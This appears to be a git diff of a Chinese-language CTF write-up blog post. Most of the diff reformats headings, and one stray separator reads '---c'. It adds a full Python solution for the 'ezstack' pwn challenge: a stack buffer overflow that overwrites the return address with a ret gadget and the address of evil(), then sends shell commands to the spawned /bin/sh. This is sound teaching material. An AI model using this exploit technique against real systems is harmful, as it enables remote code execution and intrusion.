@@ -35,9 +35,11 @@ image: "/assets/images/1778682116401.jpeg"
 
 
 
-## 题目：
+# 题目：
 
-### AAA 真签到
+---
+
+## AAA 真签到
 
 题目说明了：1337 端口对应为进程通信 TCP 转发服务，请通过 Netcat (nc) 及 其他 TCP 通讯工具 进行访问
 
@@ -92,8 +94,9 @@ s.close()
 flag{937ec5ec-c857-49b8-be97-6a50e0e232d1}
 ```
 
+---
 
-### 新年快乐
+## 新年快乐
 
 附件下载之后是一个图片
 
@@ -223,10 +226,10 @@ Part2: D4yDay
 flag{2026D4yDayH3ppi}
 ```
 
+---
 
 
-
-### BAGUA
+## BAGUA
 
 题目引言：
 ```
@@ -305,9 +308,9 @@ print(res2)
 flag{B1n4ry_B4gua_L3ibn1z_1687}
 ```
 
+---
 
-
-### Hidden Secret
+## Hidden Secret
 
 题目：
 
@@ -315,8 +318,9 @@ Luminoria 在自己的博客[https://bili33.top](https://bili33.top)中放了一
 
 据说只有机器人才能找到这个秘密，试问：你是机器人吗？
 
+---c
 
-### WEBWEBWEB
+## WEBWEBWEB
 
 获取到靶机地址后尝试curl,获得了以下内容：
 ```
@@ -674,15 +678,106 @@ else:
     print("[-] slot 0 does not look like long string/bytes")
 ```
 
+<line>
+
+## ezstack
+
+使用 IDA 打开程序，Shift + F12 搜字符串套转到主逻辑函数部分：
+
+![函数主逻辑部分](./pwm/ezstack/ida_main.png)
+
+这里看到ReadingBuffer的大小只有112，没有做防溢出保护
+
+然后程序为64位程序
+
+![64位程序](./pwm/ezstack/64.png)
+
+所以我们构造一个这样的栈布局实现入侵：
+
+<padding expand="16">
+
+![evil的地址](./pwm/ezstack/ezstack.drawio.svg)
+
+</padding>
+
+即通过写入112个A字符写到[rbp+0]的位置，然后在[rbp+8]的位置放入一个任意地址的retn指令实现linux 64位程序所需要的16位对齐，再在[rbp+16]的位置放入evil函数的地址即可完成栈溢出攻击。
+
+再查询evil的地址：
+
+![evil的地址](./pwm/ezstack/400507.png)
+
+于是有了以下代码：
+```python
+import socket
+import struct
+import time
+
+HOST = "ctf-2.xeed.run"
+PORT = 30832
+
+def p64(x):
+    return struct.pack("<Q", x)
+
+ret = 0x400506
+evil = 0x400507
+
+payload = b"A" * 120
+payload += p64(ret)
+payload += p64(evil)
+
+s = socket.create_connection((HOST, PORT))
+s.settimeout(2)
+
+# 接收题目提示
+try:
+    data = s.recv(4096)
+    print(data.decode(errors="ignore"), end="")
+except:
+    pass
+
+# 发送溢出 payload
+s.sendall(payload + b"\n")
+
+time.sleep(0.2)
+
+# evil() 里会 system("/bin/sh")，这里给 shell 发命令
+cmds = [
+    b"id\n",
+    b"pwd\n",
+    b"ls -la\n",
+    b"cat flag 2>/dev/null\n",
+    b"cat flag.txt 2>/dev/null\n",
+    b"cat /flag 2>/dev/null\n",
+    b"cat /flag.txt 2>/dev/null\n",
+    b"find / -name '*flag*' 2>/dev/null\n",
+]
+
+for cmd in cmds:
+    s.sendall(cmd)
+    time.sleep(0.1)
+
+# 持续接收输出
+while True:
+    try:
+        data = s.recv(4096)
+        if not data:
+            break
+        print(data.decode(errors="ignore"), end="")
+    except socket.timeout:
+        break
+```
+
+flag截图：
+
+![flag](./pwm/ezstack/ezstack_flag.png)
 
 
-### ezstack
 
-### ezstring
+## ezstring
 
-### baseh
+## baseh
 
-### nopnopnop
+## nopnopnop
 
 
 
